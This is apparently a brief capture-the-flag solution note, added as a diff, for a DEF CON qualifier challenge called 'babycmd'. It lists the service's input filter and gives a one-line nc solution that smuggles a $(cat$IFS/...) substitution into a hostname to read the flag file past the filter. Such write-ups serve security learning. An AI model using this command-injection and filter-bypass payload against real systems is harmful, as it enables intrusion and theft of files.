@@ -1,0 +1,9 @@
+babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me:15491
+
+hostname for dig:
+no & | * and everything below ;
+input[0] must be alphanum
+input[-2] must be below 'Z' or numeric
+
+SOLUTION:
+echo 'host asdasdaAA$(cat$IFS/home/babycmd/flag)AAasdasdadas' | nc -vv babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me 15491
